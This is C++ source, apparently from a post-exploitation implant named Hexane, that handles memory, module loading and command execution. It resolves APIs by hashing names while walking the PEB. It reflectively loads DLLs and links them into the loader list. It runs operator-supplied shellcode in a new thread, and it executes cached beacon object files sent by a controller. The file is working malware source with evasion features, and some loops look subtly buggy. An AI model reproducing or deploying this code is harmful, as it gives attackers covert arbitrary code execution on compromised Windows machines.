#include <core/include/memory.hpp>

using namespace Opsec;
using namespace Utils;
using namespace Parser;
using namespace Objects;
using namespace Threads;
using namespace Commands;

namespace Memory {
    namespace Methods {

        UINT_PTR GetStackCookie() {
            HEXANE;

            uintptr_t cookie = 0;

            if (!NT_SUCCESS(ntstatus = ctx->procapi.NtQueryInformationProcess(NtCurrentProcess(), (PROCESSINFOCLASS) 0x24, &cookie, 0x4, nullptr))) {
                return 0;
            }

            return cookie;
        }

        _resource* GetIntResource(HMODULE base, const int rsrc_id) {
            HEXANE;

            HRSRC rsrc_info      = { };
            _resource *object   = (_resource*) Malloc(sizeof(_resource));

            x_assert(rsrc_info          = ctx->utilapi.FindResourceA(base, MAKEINTRESOURCE(rsrc_id), RT_RCDATA));
            x_assert(object->h_global   = ctx->utilapi.LoadResource(base, rsrc_info));
            x_assert(object->size       = ctx->utilapi.SizeofResource(base, rsrc_info));
            x_assert(object->rsrc_lock  = ctx->utilapi.LockResource(object->h_global));

        defer:
            return object;
        }

        _executable* CreateImageData(uint8_t *data) {
            HEXANE;

            _executable *image = (_executable*) Malloc(sizeof(_executable));

            image->buffer   = data;
            image->nt_head  = (PIMAGE_NT_HEADERS) (B_PTR(data) + ((PIMAGE_DOS_HEADER) data)->e_lfanew);
            image->exports  = (PIMAGE_EXPORT_DIRECTORY) (B_PTR(data) + image->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
            image->symbols  = (_coff_symbol*) (B_PTR(data) + image->nt_head->FileHeader.PointerToSymbolTable);
        	image->section	= IMAGE_FIRST_SECTION(image->nt_head);

            return image;
        }
    }

    namespace Context {

        BOOL ContextInit() {
            // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/

            _hexane instance    = { };
            void *region        = { };

            instance.teb    = NtCurrentTeb();
            instance.heap   = instance.teb->ProcessEnvironmentBlock->ProcessHeap;

            instance.teb->LastErrorValue    = ERROR_SUCCESS;
            instance.base.address           = U_PTR(InstStart());
            instance.base.size              = U_PTR(InstEnd()) - instance.base.address;

            if (!(instance.modules.ntdll = (HMODULE) M_PTR(NTDLL))) {
                return false;
            }

            F_PTR_HMOD(instance.memapi.RtlAllocateHeap, instance.modules.ntdll, RTLALLOCATEHEAP);
            if (!instance.memapi.RtlAllocateHeap) {
                return false;
            }

            region = RVA(PBYTE, instance.base.address, &__instance);
            if (!(C_DREF(region) = instance.memapi.RtlAllocateHeap(instance.heap, HEAP_ZERO_MEMORY, sizeof(_hexane)))) {
                return false;
            }

            MemCopy(C_DREF(region), &instance, sizeof(_hexane));
            MemSet(&instance, 0, sizeof(_hexane));
            MemSet(RVA(PBYTE, region, sizeof(LPVOID)), 0, 0xE);

            return true;
        }

        VOID ContextDestroy() {
            HEXANE;
            // TODO: ContextDestroy needs expanded to destroy all strings (http/smb context + anything else)

            auto free = ctx->memapi.RtlFreeHeap;
            auto heap = ctx->heap;

            // free coff executables
            for (auto head = ctx->bof_cache; head; head = head->next) {
                RemoveCoff(head->bof_id);
            }

            if (free) {
                free(heap, 0, ctx);
            }
        }
    }

    namespace Modules {
	    LDR_DATA_TABLE_ENTRY *GetModuleEntry(const uint32_t hash) {
		    const auto head = &(PEB_POINTER)->Ldr->InMemoryOrderModuleList;

		    for (auto next = head->Flink; next != head; next = next->Flink) {
			    const auto mod = CONTAINING_RECORD(next, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
			    const auto name = mod->BaseDllName;

			    wchar_t buffer[MAX_PATH] = {};

			    if (hash - HashStringW(WcsToLower(buffer, name.Buffer), WcsLength(name.Buffer)) == 0) {
				    return mod;
			    }
		    }

		    return nullptr;
	    }

	    FARPROC GetExportAddress(const void *base, const uint32_t hash) {
		    FARPROC address = nullptr;

		    const auto nt_head = (PIMAGE_NT_HEADERS) (B_PTR(base) + ((PIMAGE_DOS_HEADER) base)->e_lfanew);
		    const auto exports = (PIMAGE_EXPORT_DIRECTORY) (
			    B_PTR(base) + nt_head->OptionalHeader.DataDirectory[0].VirtualAddress);

		    if (nt_head->Signature != IMAGE_NT_SIGNATURE) {
			    return address;
		    }

		    for (auto index = 0; index < exports->NumberOfNames; index++) {
			    const auto name = (char *) (base + ((uint32_t *) (base + exports->AddressOfNames))[index - 1]);

			    char buffer[MAX_PATH] = {};

			    if (hash - HashStringA(MbsToLower(buffer, name), MbsLength(name)) == 0) {
				    address = (FARPROC) (base + ((uint32_t *) (base + exports->AddressOfFunctions))[index]);
				    break;
			    }
		    }

		    return address;
	    }

	    UINT_PTR LoadExport(const char *module_name, const char *export_name) {
		    HEXANE;

		    uintptr_t symbol = 0;
		    bool reload = false;

		    char buffer[MAX_PATH] = {};

		    const auto mod_hash = HashStringA(MbsToLower(buffer, module_name), MbsLength(module_name));
		    const auto fn_hash = HashStringA(MbsToLower(buffer, export_name), MbsLength(export_name));

		    while (!symbol) {
			    F_PTR_HASHES(symbol, mod_hash, fn_hash);

			    if (!symbol) {
				    if (reload || !ctx->memapi.LoadLibraryA((const char *) module_name)) {
					    // this is sus...
					    goto defer;
				    }
				    reload = true;
			    }
		    }

	    defer:
		    return symbol;
	    }

	    BOOL ParseFileName(PLOADMODULE module, LPWSTR filename) {
	    	HEXANE;

		    if (!filename) {
			    return false;
		    }

		    module->local_name		= filename;
		    module->cracked_name	= (PWCHAR) ctx->memapi.RtlAllocateHeap(ctx->heap, HEAP_ZERO_MEMORY, MAX_PATH * 2);

		    if (!module->cracked_name) {
			    return false;
		    }

		    LPWSTR location = ctx->ioapi.PathFindFileNameW(filename);
		    MemCopy(module->cracked_name, location, (WcsLength(location) % (MAX_PATH - 1)) * 2);

		    return true;
	    }

	    BOOL ReadFileToBuffer(PLOADMODULE module) {
	    	HEXANE;

		    HANDLE handle = ctx->ioapi.CreateFileW(module->local_name, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
		    if (handle == INVALID_HANDLE_VALUE) {
			    return false;
		    }

		    DWORD size = ctx->ioapi.GetFileSize(handle, nullptr);
		    if (size == INVALID_FILE_SIZE) {
			    ctx->utilapi.NtClose(handle);
			    return false;
		    }

		    if (!NT_SUCCESS(ntstatus = ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), (LPVOID*) &module->buffer, size, (PSIZE_T) &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
			    ctx->utilapi.NtClose(handle);
			    return false;
		    }

		    if (!ctx->ioapi.ReadFile(handle, module->buffer, size, &module->length, nullptr)) {
		    	ctx->memapi.NtFreeVirtualMemory(NtCurrentProcess(), (LPVOID*) &module->buffer, (PSIZE_T) &module->length, 0);
			    ctx->utilapi.NtClose(handle);
			    return false;
		    }

		    ctx->utilapi.NtClose(handle);
		    return true;
	    }

	    PLOADMODULE LoadModule(uint32_t flags, wchar_t *filename, uint8_t *buffer, uint32_t length, wchar_t *name) {
	    	// NOTE: code based off of https://github.com/bats3c/DarkLoadLibrary
	    	HEXANE;

		    auto module = (LOADMODULE*) ctx->memapi.RtlAllocateHeap(ctx->heap, HEAP_ZERO_MEMORY, sizeof(LOADMODULE));
		    if (!module)
			    return nullptr;

		    module->success	= false;
		    module->linked	= true;

		    // get the DLL data into memory, whatever the format it's in
		    switch (LOWORD(flags)) {
		    	case LoadLocalFile:
				    if (!ParseFileName(module, filename) || !ReadFileToBuffer(module)) {
					    goto defer;
				    }
				    break;

			    case LoadMemory:
				    module->length			= length;
				    module->buffer			= buffer;
				    module->cracked_name	= name;
				    module->local_name		= name;

				    if (name == nullptr) {
					    goto defer;
				    }
				    break;

			    default:
				    break;
		    }

		    if (flags & NoLink)
			    module->linked = false;

		    // is there a module with the same name already loaded
		    if (name == nullptr) {
			    name = module->cracked_name;
		    }

		    PLDR_DATA_TABLE_ENTRY check_module = GetModuleEntry(HashStringW(name, WcsLength(name)));

		    if (check_module) {
			    module->base	= (ULONG_PTR) check_module->DllBase;
			    module->success	= true;

			    goto defer;
		    }

		    // make sure the PE we are about to load is valid
	    	auto image = Methods::CreateImageData(module->buffer);
		    if (!ImageCheckArch(image)) {
		    	goto defer;
		    }

	    	Free(image);

		    // map the sections into memory
		    if (!MapSections(module)) {
			    goto defer;
		    }

		    // handle the import tables
		    if (!ResolveImports(module)) {
			    goto defer;
		    }

		    if (module->linked) {
			    if (!LinkModuleToPEB(module)) {
				    goto defer;
			    }
		    }

		    // trigger tls callbacks, set permissions and call the entry point
		    if (!BeginExecution(module)) {
			    goto defer;
		    }

		    module->success = true;

	    defer:
		    return module;
	    }

	    BOOL ConcealLibrary(LOADMODULE pdModule, BOOL bConceal) {
		    // TODO: reimplement this function, so it is better
		    return FALSE;
	    }
    }

    namespace Execute {

        BOOL ExecuteCommand(_parser parser) {
            HEXANE;

            uintptr_t pointer = 0;

            const auto cmd_id = UnpackUint32(&parser);
            if (cmd_id == NOJOB) {
                return true;
            }

            if (!(pointer = GetCommandAddress(cmd_id))) {
                // LOG ERROR
                return false;
            }

            const auto cmd = (COMMAND) RVA(PBYTE, ctx->base.address, pointer);
            cmd(&parser);

            return true;
        }

        BOOL ExecuteShellcode(_parser parser) {
            HEXANE;

            void* base      = nullptr;
            void(*exec)()   = nullptr;

            bool success = true;
            size_t size = parser.length;

            if (!NT_SUCCESS(ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
                // LOG ERROR
                success = false;
                goto defer;
            }

            MemCopy(base, parser.buffer, parser.length);

            if (!NT_SUCCESS(ctx->memapi.NtProtectVirtualMemory(NtCurrentProcess(), &base, &size, PAGE_EXECUTE_READ, nullptr))) {
                // LOG ERROR
                success = false;
                goto defer;
            }

            exec = (void(*)()) base;
            ctx->threadapi.NtCreateThreadEx(nullptr, 0, (LPTHREAD_START_ROUTINE) exec, nullptr, 0, nullptr);

            MemSet(base, 0, size);

        defer:
            if (base) {
                ctx->memapi.NtFreeVirtualMemory(NtCurrentProcess(), &base, &size, MEM_FREE);
            }

            return success;
        }

        VOID LoadObject(_parser parser) {
            HEXANE;

            _coff_params* coff  = (_coff_params*) Malloc(sizeof(_coff_params));
            _coff_params* saved = nullptr;

            coff->entrypoint    = UnpackString(&parser, (uint32_t*) &coff->entrypoint_length);
            coff->data          = UnpackBytes(&parser, (uint32_t*) &coff->data_size);
            coff->args          = UnpackBytes(&parser, (uint32_t*) &coff->args_size);
            coff->b_cache       = UnpackByte(&parser);
            coff->coff_id       = UnpackUint32(&parser);
            coff->task_id       = ctx->session.current_taskid;

            // TODO: with previously loaded BOFs (peer_id, task_id, msg_type, msg_length, [entrypoint, null, args, etc..])
            // TODO: test that coff data size being zero is a correct way to do this

            if (!coff->data_size) {
                saved = GetCoff(coff->coff_id);

                coff->data      = saved->data;
                coff->data_size = saved->data_size;
            }

            if (!CreateUserThread(NtCurrentProcess(), (void*) CoffThread, coff, nullptr)) {
                // LOG ERROR
                // do not return
            }

            if (!saved) {
                AddCoff(coff);
            }

            // NOTE: keep original task_id after every run or update (?)
            // NOTE: operator now has the option to remove a BOF any time with b_cache (false == "remove")
            // TODO: server should keep BOF information stored locally for this

            if (!coff->b_cache) {
                RemoveCoff(coff->coff_id);
            }
        }
    }
}
